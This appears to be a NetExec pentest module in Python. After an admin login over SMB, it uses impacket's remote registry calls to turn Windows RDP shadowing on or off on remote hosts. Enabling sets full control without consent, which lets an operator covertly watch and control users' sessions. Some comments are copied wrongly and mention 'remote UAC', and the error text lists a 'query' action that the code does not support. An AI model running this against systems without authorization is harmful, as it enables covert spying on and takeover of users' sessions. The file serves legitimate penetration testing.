from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations

# Module by @Defte_
# Enables or disables shadow RDP
class NXCModule:
    name = "shadowrdp"
    description = "Enables or disables shadow RDP"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.action = None

    def options(self, context, module_options):
    
        if "ACTION" not in module_options:
            context.log.fail("ACTION option not specified!")
            exit(1)

        if module_options["ACTION"].lower() not in ["enable", "disable"]:
            context.log.fail("ACTION must be either enable, disable or query")
            exit(1)
        self.action = module_options["ACTION"].lower()

    def on_admin_login(self, context, connection):
        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()
            if remoteOps._RemoteOperations__rrp:
                ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
                regHandle = ans["phKey"]

                keyHandle = rrp.hBaseRegOpenKey(
                    remoteOps._RemoteOperations__rrp,
                    regHandle, 
                    "Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\\"
                )["phkResult"]

                # Checks if the key already exists or not
                try:
                    rrp.hBaseRegQueryValue(
                        remoteOps._RemoteOperations__rrp,
                        keyHandle,
                        "Shadow\x00"
                    )
                except Exception as e:
                    if "ERROR_FILE_NOT_FOUND" in str(e):
                        context.log.debug("here")
                        ans = rrp.hBaseRegCreateKey(
                            remoteOps._RemoteOperations__rrp,
                            keyHandle,
                            "Shadow\x00")

                # Disable remote UAC
                if self.action == "disable":
                    rrp.hBaseRegSetValue(
                        remoteOps._RemoteOperations__rrp,
                        keyHandle,
                        "Shadow\x00",
                        rrp.REG_DWORD,
                        0
                    )
                    context.log.highlight("Shadow RDP disabled")
                
                # Enable remote UAC
                if self.action == "enable":
                    rrp.hBaseRegSetValue(
                        remoteOps._RemoteOperations__rrp,
                        keyHandle,
                        "Shadow\x00",
                        rrp.REG_DWORD,
                        2
                    )
                    context.log.highlight("Shadow RDP with full access enabled")

        except Exception as e:
            context.log.debug(f"Error {e}")
        finally:
            remoteOps.finish()
